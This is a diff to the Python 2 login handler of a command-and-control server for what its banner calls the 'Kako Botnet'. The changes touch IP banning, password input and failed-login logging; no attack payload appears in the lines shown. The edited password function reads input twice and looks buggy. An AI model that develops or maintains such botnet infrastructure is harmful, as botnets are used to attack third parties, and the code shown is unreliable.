@@ -53,8 +53,8 @@ def clientThread(conn):
 			if ip in bannedLine:
 				conn.send("[!] Your IP Address has been banned.\r\n")
 				conn.close()
-			else:
-				pass
+		else:
+			pass
 
 		def username(conn, prefix="Username: "):
 		    conn.send(prefix)
@@ -62,7 +62,9 @@ def clientThread(conn):
 
 		def password(conn, prefix="Password: "):
 		    conn.send(prefix)
-		    return conn.recv(512)
+		    data = conn.recv(512)
+		    if data:
+		        return conn.recv(512)
 
 		createLogin = file("login.txt", "a")
 
@@ -72,8 +74,6 @@ def clientThread(conn):
 		while True:
 			username = username(conn)
 			password = password(conn)
-			#conn.send("%s\r\n" % username)
-			#conn.send("%s\r\n" % password)
 			for line in lines:
 				if line.split(":")[0] == username and line.split(":")[1] == password:
 					conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
@@ -99,7 +99,7 @@ def clientThread(conn):
 								if data:
 									return conn.recv(512)
 
-							message = message(conn) # If you press enter without anything in it, it wont do anything until you press it a second time...
+							message = message(conn)
 
 							if message:
 								if line.split(":")[2].startswith("1"):
@@ -222,7 +222,6 @@ def clientThread(conn):
 			else:
 				try:
 					ip = conn.getpeername()
-					#ip = load(urlopen('http://jsonip.com'))['ip']
 					fail = file("fails.txt", "a")
 					fail.write("%s:%s:%s\r\n" % (ip, username, password))
 					conn.send("[!] Incorrect Information!\r\n")
